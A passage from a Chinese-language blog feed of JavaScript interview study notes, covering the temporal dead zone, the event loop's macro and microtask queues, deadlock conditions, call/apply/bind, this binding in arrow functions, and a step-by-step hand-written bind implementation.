color="#FF8C00">定义的时候必须赋值并且不能改变。</font>**</li></ul><blockquote><p>在 TDZ 内部，如果获取或设置变量将抛出异常：</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">if (true) &#123; // enter new scope, TDZ starts</span><br><span class="line">    // Uninitialized binding for `tmp` is created</span><br><span class="line"></span><br><span class="line">    tmp = &#x27;abc&#x27;; // ReferenceError</span><br><span class="line">    console.log(tmp); // ReferenceError</span><br><span class="line"></span><br><span class="line">    let tmp; // TDZ ends, `tmp` is initialized with `undefined`</span><br><span class="line">    console.log(tmp); // undefined</span><br><span class="line"></span><br><span class="line">    tmp = 123;</span><br><span class="line">    console.log(tmp); // 123</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>下面的示例将演示死区（dead zone）是<font color="#FF00FF">真正短暂的（基于时间）和不受空间条件限制（基于位置）</font></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">if (true) &#123; // enter new scope, TDZ starts</span><br><span class="line">    const func = function () &#123;</span><br><span class="line">        console.log(myVar); // OK!</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    // Here we are within the TDZ and</span><br><span class="line">    // accessing `myVar` would cause a `ReferenceError`</span><br><span class="line"></span><br><span class="line">    let myVar = 3; // TDZ ends</span><br><span class="line">    func(); // called outside TDZ</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>typeof与暂时性死区，变量在暂时性死区无法被访问，所以无法对它使用typeof：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">if (true) &#123;</span><br><span class="line">    console.log(typeof tmp); // ReferenceError</span><br><span class="line">    let tmp;</span><br><span class="line">&#125;s</span><br></pre></td></tr></table></figure><h1 id="面向对象的三个特征，分别说一下什么意思"><a href="#面向对象的三个特征，分别说一下什么意思" class="headerlink" title="面向对象的三个特征，分别说一下什么意思"></a>面向对象的三个特征，分别说一下什么意思</h1><p><strong>封装：</strong> 将对象运行所需的资源封装在程序对象中——基本上，是方法和数据。对象是“公布其接口”。其他附加到这些接口上的对象不需要关心对象实现的方法即可使用这个对象。这个概念就是“不要告诉我你是怎么做的，只要做就可以了。”对象可以看作是一个自我包含的原子。<font color="#FF8C00">对象接口包括了公共的方法和初始化数据。</font></p><p><strong>继承：</strong> 继承可以解决代码复用，让编程更加靠近人类思维。当多个类存在相同的属性(变量)和方法时，可以从这些类中抽象出父类，在父类中定义这些相同的属性和方法，所有的子类不需要重新定义这些属性和方法，只需要通过继承父类中的属性和方法。</p><p><strong>多态：</strong> 多态是指一个引用(类型)在不同情况下的多种状态。也可以理解成：<font color="#FF00FF">多态是指通过指向父类的引用，来调用在不同子类中实现的方法</font>。</p><p><font color="#FF8C00">特点：</font></p><ul><li>封装可以隐藏实现细节，使得代码模块化；</li><li>继承可以扩展已存在的代码模块（类），它们的目的都是为了——代码重用。</li><li>多态就是<font color="#FF00FF">相同的事物，调用其相同的方法，参数也相同时，但表现的行为却不同。多态分为两种，一种是行为多态与对象的多态</font></li></ul>]]></content>
    
    
    <summary type="html">每天/周学习计划</summary>
    
    
    
    <category term="plan" scheme="https://merlynr.github.io/categories/plan/"/>
    
    
    <category term="study" scheme="https://merlynr.github.io/tags/study/"/>
    
    <category term="graduate student" scheme="https://merlynr.github.io/tags/graduate-student/"/>
    
    <category term="plan" scheme="https://merlynr.github.io/tags/plan/"/>
    
    <category term="daily/weekly" scheme="https://merlynr.github.io/tags/daily-weekly/"/>
    
  </entry>
  
  <entry>
    <title>JS工作原理(第七天)</title>
    <link href="https://merlynr.github.io/2022/08/03/JS%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86(%E7%AC%AC%E4%B8%83%E5%A4%A9)-DESKTOP-GBOPJPV/"/>
    <id>https://merlynr.github.io/2022/08/03/JS%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86(%E7%AC%AC%E4%B8%83%E5%A4%A9)-DESKTOP-GBOPJPV/</id>
    <published>2022-08-02T16:00:00.000Z</published>
    <updated>2022-08-02T16:00:00.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="为什么js是单线程"><a href="#为什么js是单线程" class="headerlink" title="为什么js是单线程"></a>为什么js是单线程</h1><p>这主要和js的用途有关，js是作为浏览器的脚本语言，主要是实现用户与浏览器的交互，以及操作dom；这决定了它只能是单线程，否则会带来很复杂的同步问题。 <strong>举个例子：如果js被设计了多线程，如果有一个线程要修改一个dom元素，另一个线程要删除这个dom元素，此时浏览器就会一脸茫然，不知所措。</strong> 所以，为了避免复杂性，从一诞生，JavaScript就是单线程，这已经成了这门语言的核心特征，将来也不会改变</p><p><font color="#FF8C00">扩展：</font></p><p>什么是进程？<br>进程：是<font color="#FF8C00">cpu分配资源的最小单位</font>；（<font color="#FF8C00">是能拥有资源和独立运行的最小单位</font>）</p><p>什么是线程？<br>线程：<font color="#FF8C00">是cpu调度的最小单位；（线程是建立在进程的基础上的一次程序运行单位，一个进程中可以有多个线程</font>）</p><p>浏览器是多进程的？<br>放在浏览器中，<font color="#FF8C00">每打开一个tab页面，其实就是新开了一个进程，在这个进程中，还有ui渲染线程，js引擎线程，http请求线程等。 所以，浏览器是一个多进程的。</font></p><p><font color="#FF00FF">为了利用多核CPU的计算能力，HTML5提出Web Worker标准，允许JavaScript脚本创建多个线程，但是子线程完全受主线程控制，且不得操作DOM。所以，这个新标准并没有改变JavaScript单线程的本质</font>。</p><h1 id="宏微队列及执行顺序"><a href="#宏微队列及执行顺序" class="headerlink" title="宏微队列及执行顺序"></a>宏微队列及执行顺序</h1><p>JS 中用来存储待执行回调函数的队列包含 2 个不同特定的列队</p><ul><li>宏列队：用来保存待执行的宏任务（回调），比如：定时器回调、DOM 事件回调、ajax 回调</li><li>微列队：用来保存待执行的微任务（回调），比如：promise的回调、MutationObserver 的回调</li></ul><p>JS 执行时会区别这 2 个队列</p><ul><li>JS 引擎首先必须先执行所有的初始化同步任务代码</li><li><font color="#FF8C00">每次准备取出第一个宏任务执行前, 都要将所有的微任务一个一个取出来执行，也就是优先级比宏任务高，且与微任务所处的代码位置无关</font></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">setTimeout(() =&gt; &#123; //立即放入宏队列</span><br><span class="line">      console.log(&#x27;timeout callback1（）&#x27;)</span><br><span class="line">      Promise.resolve(3).then(</span><br><span class="line">        value =&gt; &#123; //立即放入微队列</span><br><span class="line">          console.log(&#x27;Promise onResolved3()&#x27;, value)</span><br><span class="line">        &#125;</span><br><span class="line">      )</span><br><span class="line">    &#125;, 0)</span><br><span class="line"></span><br><span class="line">    setTimeout(() =&gt; &#123; //立即放入宏队列</span><br><span class="line">      console.log(&#x27;timeout callback2（）&#x27;)</span><br><span class="line">    &#125;, 0)</span><br><span class="line"></span><br><span class="line">    Promise.resolve(1).then(</span><br><span class="line">      value =&gt; &#123; //立即放入微队列</span><br><span class="line">        console.log(&#x27;Promise onResolved1()&#x27;, value)</span><br><span class="line">        setTimeout(() =&gt; &#123;</span><br><span class="line">          console.log(&#x27;timeout callback3（）&#x27;, value)</span><br><span class="line">        &#125;, 0)</span><br><span class="line">      &#125;</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    Promise.resolve(2).then(</span><br><span class="line">      value =&gt; &#123; //立即放入微队列</span><br><span class="line">        console.log(&#x27;Promise onResolved2()&#x27;, value)</span><br><span class="line">      &#125;</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    // Promise onResolved1() 1</span><br><span class="line">    // Promise onResolved2() 2</span><br><span class="line">    // timeout callback1（）</span><br><span class="line">    // Promise onResolved3() 3</span><br><span class="line">    // timeout callback2（）</span><br><span class="line">    // timeout callback3（） 1</span><br></pre></td></tr></table></figure><h1 id="死锁"><a href="#死锁" class="headerlink" title="死锁"></a>死锁</h1><p><font color="#FF8C00">死锁是指两个或两个以上的进程在执行过程中，由于竞争资源而造成阻塞的现象，若无外力作用，它们都将无法继续执行</font></p><p><strong>产生原因</strong></p><ul><li>竞争资源引起进程死锁</li><li>可剥夺和非剥夺资源</li><li>竞争非剥夺资源</li><li>竞争临时性资源</li><li>进程推进顺序不当</li><li></li></ul><p><strong>产生条件</strong></p><ol><li>互斥条件：涉及的资源是非共享的<ul><li>涉及的资源是非共享的,一段时间内某资源只由一个进程占用,如果此时还有其它进程请求资源，则请求者只能等待，直至占有资源的进程用毕释放</li></ul></li><li>不剥夺条件：不能强行剥夺进程拥有的资源<ul><li>进程已获得的资源，在未使用完之前，不能被剥夺，只能在使用完时由自己释放</li></ul></li><li>请求和保持条件：进程在等待一新资源时继续占有已分配的资源<ul><li>指进程已经保持至少一个资源，但又提出了新的资源请求，而该资源已被其它进程占有，此时请求进程阻塞，但又对自己已获得的其它资源保持不放</li></ul></li><li>环路等待条件：存在一种进程的循环链，链中的每一个进程已获得的资源同时被链中的下一个进程所请求 在发生死锁时，必然存在一个进程——资源的环形链</li></ol><p><font color="#FF00FF">解决办法</font><br>只要打破四个必要条件之一就能有效预防死锁的发生</p><h1 id="暂时性死区"><a href="#暂时性死区" class="headerlink" title="暂时性死区"></a>暂时性死区</h1><p>暂时性死区的本质就是，<font color="#FF00FF">只要一进入当前作用域，所要使用的变量就已经存在了，但是不可获取，只有等到声明变量的那一行代码出现，才可以获取和使用该变量</font>。<br><strong>扩展：</strong><br>let 、const与暂时性死区</p><p>let或const声明的变量拥有暂时性死区（TDZ）：当进入它的作用域，它不能被访问（获取或设置）直到执行到达声明。</p><p>首先看看<font color="#FF8C00">不具有</font>暂时性死区的var：</p><ul><li>当进入var变量的作用域（包围它的函数）<strong>，立即为它创建（绑定）存储空间。变量会立即<font color="#FF00FF">被初始化并赋值</font>为undefined。</strong></li><li>当执行到变量声明的时候，如果变量定义了值则会被赋值。</li></ul><p>通过let声明的变量拥有暂时性死区，生命周期如下：</p><ul><li>当进入let变量的作用域（包围它的语法块），立即为它创建（绑定）存储空间。此时变量仍是<font color="#FF00FF">未初始化</font>的。</li><li>获取或设置未初始化的变量将抛出异常ReferenceError。</li><li>当执行到变量声明的时候，如果变量定义了值则会被赋值。如果没有定义值，则赋值为undefined。</li><li>const工作方式与let类似，但是**<font color="#FF8C00">定义的时候必须赋值并且不能改变。</font>**</li></ul><blockquote><p>在 TDZ 内部，如果获取或设置变量将抛出异常：</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">if (true) &#123; // enter new scope, TDZ starts</span><br><span class="line">    // Uninitialized binding for `tmp` is created</span><br><span class="line"></span><br><span class="line">    tmp = &#x27;abc&#x27;; // ReferenceError</span><br><span class="line">    console.log(tmp); // ReferenceError</span><br><span class="line"></span><br><span class="line">    let tmp; // TDZ ends, `tmp` is initialized with `undefined`</span><br><span class="line">    console.log(tmp); // undefined</span><br><span class="line"></span><br><span class="line">    tmp = 123;</span><br><span class="line">    console.log(tmp); // 123</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>下面的示例将演示死区（dead zone）是<font color="#FF00FF">真正短暂的（基于时间）和不受空间条件限制（基于位置）</font></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">if (true) &#123; // enter new scope, TDZ starts</span><br><span class="line">    const func = function () &#123;</span><br><span class="line">        console.log(myVar); // OK!</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    // Here we are within the TDZ and</span><br><span class="line">    // accessing `myVar` would cause a `ReferenceError`</span><br><span class="line"></span><br><span class="line">    let myVar = 3; // TDZ ends</span><br><span class="line">    func(); // called outside TDZ</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>typeof与暂时性死区，变量在暂时性死区无法被访问，所以无法对它使用typeof：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">if (true) &#123;</span><br><span class="line">    console.log(typeof tmp); // ReferenceError</span><br><span class="line">    let tmp;</span><br><span class="line">&#125;s</span><br></pre></td></tr></table></figure><h1 id="面向对象的三个特征，分别说一下什么意思"><a href="#面向对象的三个特征，分别说一下什么意思" class="headerlink" title="面向对象的三个特征，分别说一下什么意思"></a>面向对象的三个特征，分别说一下什么意思</h1><p><strong>封装：</strong> 将对象运行所需的资源封装在程序对象中——基本上，是方法和数据。对象是“公布其接口”。其他附加到这些接口上的对象不需要关心对象实现的方法即可使用这个对象。这个概念就是“不要告诉我你是怎么做的，只要做就可以了。”对象可以看作是一个自我包含的原子。<font color="#FF8C00">对象接口包括了公共的方法和初始化数据。</font></p><p><strong>继承：</strong> 继承可以解决代码复用，让编程更加靠近人类思维。当多个类存在相同的属性(变量)和方法时，可以从这些类中抽象出父类，在父类中定义这些相同的属性和方法，所有的子类不需要重新定义这些属性和方法，只需要通过继承父类中的属性和方法。</p><p><strong>多态：</strong> 多态是指一个引用(类型)在不同情况下的多种状态。也可以理解成：<font color="#FF00FF">多态是指通过指向父类的引用，来调用在不同子类中实现的方法</font>。</p><p><font color="#FF8C00">特点：</font></p><ul><li>封装可以隐藏实现细节，使得代码模块化；</li><li>继承可以扩展已存在的代码模块（类），它们的目的都是为了——代码重用。</li><li>多态就是<font color="#FF00FF">相同的事物，调用其相同的方法，参数也相同时，但表现的行为却不同。多态分为两种，一种是行为多态与对象的多态</font></li></ul>]]></content>
    
    
    <summary type="html">每天/周学习计划</summary>
    
    
    
    <category term="plan" scheme="https://merlynr.github.io/categories/plan/"/>
    
    
    <category term="study" scheme="https://merlynr.github.io/tags/study/"/>
    
    <category term="graduate student" scheme="https://merlynr.github.io/tags/graduate-student/"/>
    
    <category term="plan" scheme="https://merlynr.github.io/tags/plan/"/>
    
    <category term="daily/weekly" scheme="https://merlynr.github.io/tags/daily-weekly/"/>
    
  </entry>
  
  <entry>
    <title>上下文this相关内容</title>
    <link href="https://merlynr.github.io/2022/08/03/%E4%B8%8A%E4%B8%8B%E6%96%87this%E7%9B%B8%E5%85%B3%E5%86%85%E5%AE%B9(%E7%AC%AC%E5%9B%9B%E5%A4%A9)/"/>
    <id>https://merlynr.github.io/2022/08/03/%E4%B8%8A%E4%B8%8B%E6%96%87this%E7%9B%B8%E5%85%B3%E5%86%85%E5%AE%B9(%E7%AC%AC%E5%9B%9B%E5%A4%A9)/</id>
    <published>2022-08-02T16:00:00.000Z</published>
    <updated>2022-08-02T16:00:00.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="call-appy-bind的作用和区别"><a href="#call-appy-bind的作用和区别" class="headerlink" title="call appy bind的作用和区别"></a>call appy bind的作用和区别</h1><p><strong>作用：</strong><br>都可以改变函数内部的this指向。</p><p><strong>区别点：</strong><br>call 和 apply 会调用函数，并且改变函数内部this指向。<br>call 和 apply 传递的参数不一样，call 传递参数arg1,arg2…形式 apply 必须数组形式[arg]<br>bind 不会调用函数，可以改变函数内部this指向。</p><p><strong>解析：</strong><br>call方法<br>改变函数内部this指向<br>call()方法<font color="#FF00FF">调用一个对象。简单理解为调用函数的方式</font>，但是它可以改变函数的this指向。<br>写法：fun.call(thisArg, arg1, arg3, …) // thisArg为想要指向的对象，arg1,arg3为参数</p><p>call 的主要作用也可以<font color="#FF8C00">实现继承</font></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">function Person(uname, age) &#123;</span><br><span class="line">    this.uname = uname;</span><br><span class="line">    this.age = age;</span><br><span class="line">  &#125;</span><br><span class="line">  function Son(uname, age) &#123;</span><br><span class="line">    Person.call(this, uname, age);</span><br><span class="line">  &#125;</span><br><span class="line">  var son = new Son(&quot;zhang&quot;, 12);</span><br><span class="line">  console.log(son);</span><br></pre></td></tr></table></figure><p>apply方法</p><p>apply()方法调用<font color="#FF00FF">一个函数</font>。简单理解为调用函数的方式，但是它可以改变函数的this指向。<br>写法：fun.apply(thisArg, [argsArray])<br>thisArg:在fun函数运行时指定的this值<br>argsArray:传递的值，必须包含在数组里面<br>返回值就是函数的返回值，因为他就是调用函数<br>apply的主要应用，比如可以利用apply可以求得数组中最大值</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">const arr = [1, 22, 3, 44, 5, 66, 7, 88, 9];</span><br><span class="line">const max = Math.max.apply(Math, arr);</span><br><span class="line">console.log(max);</span><br></pre></td></tr></table></figure><p>bind方法</p><p>bind()方法<font color="#FF00FF">不会调用函数</font>，但是能改变函数内部this指向<br>写法：fun.bind(thisArg, arg1, arg2, …)</p><p>thisArg:<font color="#FF8C00">在fun函数运行时指定的this值</font><br>arg1,arg2:传递的其他参数<br><font color="#FF00FF">返回由指定的this值和初始化参数改造的原函数拷贝</font></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">var o = &#123;</span><br><span class="line">    name: &quot;lisa&quot;</span><br><span class="line">&#125;;</span><br><span class="line">function fn() &#123;</span><br><span class="line">    console.log(this);</span><br><span class="line">&#125;</span><br><span class="line">var f = fn.bind(o);</span><br><span class="line">f();</span><br></pre></td></tr></table></figure><p>如果有的函数我们不需要立即调用，但是<font color="#FF00FF">又需要改变这个函数的this指向</font>，此时用bind再合适不过了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">const btns = document.querySelectorAll(&quot;button&quot;);</span><br><span class="line">for (let i = 0; i &lt; btns.length; i++) &#123;</span><br><span class="line">    btns[i].onclick = function() &#123;</span><br><span class="line">      this.disabled = true;</span><br><span class="line">      setTimeout(</span><br><span class="line">        function() &#123;</span><br><span class="line">          this.disabled = false;</span><br><span class="line">        &#125;.bind(this),</span><br><span class="line">        2000</span><br><span class="line">      );</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>主要应用场景</strong>：<br>call 经常做继承。<br>apply 经常跟数组有关系，比如借助于数学对象实现数组最大值最小值。<br>bind 不调用函数，但是还想改变this指向，比如改变定时器内部的this指向。</p><h1 id="this指向（普通函数、箭头函数）"><a href="#this指向（普通函数、箭头函数）" class="headerlink" title="this指向（普通函数、箭头函数）"></a>this指向（普通函数、箭头函数）</h1><h2 id="普通函数中的this"><a href="#普通函数中的this" class="headerlink" title="普通函数中的this"></a>普通函数中的this</h2><p>谁调用了函数或者方法，那么这个函数或者对象中的this就指向谁</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">let getThis = function () &#123;</span><br><span class="line">    console.log(this);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">let obj=&#123;</span><br><span class="line">    name:&quot;Jack&quot;,</span><br><span class="line">    getThis:function()&#123;</span><br><span class="line">        console.log(this);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">//getThis()方法是由window在全局作用域中调用的，所以this指向调用该方法的对象，即window</span><br><span class="line">getThis();//window</span><br><span class="line">//此处的getThis()方法是obj这个对象调用的，所以this指向obj</span><br><span class="line">obj.getThis();//obj</span><br></pre></td></tr></table></figure><h2 id="匿名函数中的this"><a href="#匿名函数中的this" class="headerlink" title="匿名函数中的this"></a>匿名函数中的this</h2><p>匿名函数的执行<font color="#FF8C00">具有全局性，则匿名函数中的this指向是window，而不是调用该匿名函数的对象</font></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">let obj = &#123;</span><br><span class="line">    getThis: function () &#123;</span><br><span class="line">        return function () &#123; //匿名函数</span><br><span class="line">            console.log(this);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">obj.getThis()(); //window</span><br></pre></td></tr></table></figure><p>上面代码中，getThi()方法是由obj调用，但是obj.getThis()返回的是一个匿名函数，而匿名函数中的this指向window，所以打印出window。 如<font color="#FF00FF">果想在上述代码中使this指向调用该方法的对象，可以提前把this传值给另外一个变量(_this或者that)</font>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">let obj = &#123;</span><br><span class="line">     getThis: function () &#123;</span><br><span class="line">     //提前保存this指向</span><br><span class="line">         let _this=this</span><br><span class="line">         return function () &#123;</span><br><span class="line">             console.log(_this);</span><br><span class="line">         &#125;</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> obj.getThis()(); //obj</span><br></pre></td></tr></table></figure><h2 id="箭头函数中的this"><a href="#箭头函数中的this" class="headerlink" title="箭头函数中的this"></a>箭头函数中的this</h2><ol><li>箭头函数中的this是<font color="#FF00FF">在函数定义的时候就确定下来的</font>，而不是在函数调用的时候确定的；</li><li>箭头函数中的<font color="#FF00FF">this指向父级作用域的执行上下文</font>；（技巧：<font color="#FF8C00">因为javascript中除了全局作用域，其他作用域都是由函数创建出来的，所以如果想确定this的指向，则找到离箭头函数最近的function，与该function平级的执行上下文中的this即是箭头函数中的this</font>）</li><li><font color="#FF00FF">箭头函数无法使用apply、call和bind方法改变this指向，因为其this值在函数定义的时候就被确定下来</font>。</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">let obj = &#123;</span><br><span class="line">    【this】//此处的this即是箭头函数中的this</span><br><span class="line">    getThis: function () &#123;</span><br><span class="line">        return  ()=&gt; &#123;</span><br><span class="line">            console.log(this);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">obj.getThis()(); //obj</span><br></pre></td></tr></table></figure><p>首先，距离箭头函数最近的是getThis(){}，与该函数平级的执行上下文是obj中的执行上下文，箭头函数中的this就是下注释代码处的this，即obj。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"> //代码中有两个箭头函数，由于找不到对应的function，所以this会指向window对象。</span><br><span class="line">let obj = &#123;</span><br><span class="line">     getThis: ()=&gt; &#123;</span><br><span class="line">         return  ()=&gt; &#123;</span><br><span class="line">             console.log(this);</span><br><span class="line">         &#125;</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> obj.getThis()(); //window</span><br></pre></td></tr></table></figure><p>该段代码中存在两个箭头函数，this找不到对应的function(){}，所以一直往上找直到指向window</p><h2 id="手写bind【TODO】"><a href="#手写bind【TODO】" class="headerlink" title="手写bind【TODO】"></a>手写bind【TODO】</h2><ol><li>Function.prototype.bind,这样就可以让所有函数的隐式原型上都会有一个bind了。</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Function.prototype.bind = function() &#123;</span><br><span class="line">    // TODO</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="2"><li>bind的第一个形参是要绑定给函数的上下文，所以再完善一下上面的代码</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Function.prototype.bind = function(context) &#123;</span><br><span class="line">    var fn = this;</span><br><span class="line">    return function() &#123;</span><br><span class="line">        return fn.apply(context);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="3"><li>真正的bind函数是可以传递多个参数的，第一个参数是要绑定给调用它的函数的上下文，其他的参数将会作为预设参数传递给这个函数，如下所示</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">let foo = function()&#123;</span><br><span class="line">    console.log(arguments);</span><br><span class="line">&#125;</span><br><span class="line">foo.bind(null,&quot;a&quot;,&quot;b&quot;)(&quot;c&quot;,&quot;d&quot;,&quot;e&quot;); // &#123;&quot;1&quot;:&quot;a&quot;,&quot;2&quot;:&quot;b&quot;,&quot;3&quot;:&quot;c&quot;,&quot;4&quot;:&quot;d&quot;,&quot;5&quot;:&quot;e&quot;&#125;</span><br></pre></td></tr></table></figure><ol start="4"><li>为了实现上面的效果，我们发现只要在返回的值上将函数合并上去就行了</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Function.prototype.bind = function(context, ...args) &#123;</span><br><span class="line">    var fn = this;</span><br><span class="line">    return function(...rest) &#123;</span><br><span class="line">        return fn.apply(context,[...args, ...rest]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="5"><li>为了兼容性，替换成ES5的写法</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Function.prototype.bind = function() &#123;</span><br><span class="line">    var args = Array.prototype.slice.call(arguments);</span><br><span class="line">    var context = args.splice(0,1)[0];</span><br><span class="line">    var fn = this;</span><br><span class="line">    return function() &#123;</span><br><span class="line">        let rest = Array.prototype.slice.call(arguments);</span><br><span class="line">        return fn.apply(context, args.concat(rest));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="6"><li>把函数的原型保留下来。</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Function.prototype.bind = function() 